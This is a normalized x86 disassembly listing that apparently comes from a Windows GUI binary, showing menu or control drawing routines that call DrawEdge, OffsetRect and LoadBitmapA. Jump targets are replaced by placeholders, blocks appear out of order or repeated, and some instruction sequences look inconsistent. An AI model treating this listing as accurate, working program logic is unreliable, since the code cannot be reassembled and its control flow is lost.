sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457158
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_459e54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_424538
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425280
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424dc0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_42426c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403128
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425280
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_459e54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a993
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_458f18
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_459e54
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45a9ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45b2b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424a38
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_42426c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042c4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424a38
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_456c40
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425280
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424a38
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424a38
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42b858
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424a0c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45adf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42a64c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_42426c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_456c40
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_459e54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_424538
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425280
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42503c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457158
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425280
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424dc0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_42426c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403128
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_459e54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b2bb
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_458f18
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_4250bc
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_459e54
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45b408
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45bdec
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45b438
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_45b484
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45b666
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403324
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45b438
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_45bdec
mov esi eax
